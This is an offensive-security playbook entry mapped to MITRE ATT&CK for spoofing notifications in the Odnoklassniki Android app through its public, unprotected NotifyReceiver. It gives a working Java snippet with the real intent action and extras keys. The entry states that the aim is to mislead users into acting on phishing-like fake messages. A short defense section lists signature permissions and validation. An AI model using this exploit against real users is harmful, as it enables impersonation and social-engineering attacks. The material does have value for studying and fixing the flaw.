---
tags:
  - android
  - intent-spoofing
  - notifications
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/send-fake-notification-intent]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1417]]'
updated_at: '2025-12-14T17:24:42.379Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 2def5581-b054-4e1f-b8cd-ad246345764a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[T1417]]'
---
# Send Fake Notifications via Intent Spoofing

## Summary

This procedure broadcasts fake intents to the public NotifyReceiver in the Odnoklassniki app, impersonating messages, comments, or events to mislead users into unintended actions like responding to phishing-like notifications.

## Description

The NotifyReceiver is public and permissionless, allowing any app to send broadcasts with spoofed extras (e.g., message text, IDs). This exploits implicit intent handling, displaying fake content in the app's UI or system notifications. Useful for social engineering within the app ecosystem.

## Requirements

1. Android device with Odnoklassniki installed
2. Malicious app with broadcast capability
3. Knowledge of intent action and extra keys from decompiled code

## Defense

Defensive measures and detection strategies:

- Require signature permissions for broadcast receivers
- Validate extra data integrity and source in receiver onReceive
- Log anomalous broadcasts and monitor app behavior

## Objectives

1. Broadcast spoofed notification intent
2. Display fake event to user
3. Induce user interaction or confusion

## Instructions

### Step 1: Construct Fake Intent

**Context**: Build an intent with the notification action and spoofed extras for a photo comment scenario.

**Command** ([[commands/send-fake-notification-intent]]):
```java
Intent u = new Intent(); u.setAction("ru.ok.android.action.NOTIFY"); u.putExtra("key", "d-147298617"); u.putExtra("message", "Hello there! This is a fake message. You have been tricked."); u.putExtra("dsc_id", "612470493988:USER_PHOTO"); getActivity().sendBroadcast(u);
```

> Sets action to target receiver, adds extras for key, message, and description ID. Expected output: Fake notification appears.

### Step 2: Observe User Response

**Context**: No code; monitor if user engages with the fake notification.

**Command** (UI observation):

> Success: User views or acts on the impersonated event.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[T1417]] Hijack Execution Flow

### Sub-Techniques

-

## Commands Used

- [[commands/send-fake-notification-intent]]

## Tools Used

-

## Tags

- android
- intent-spoofing
- notifications
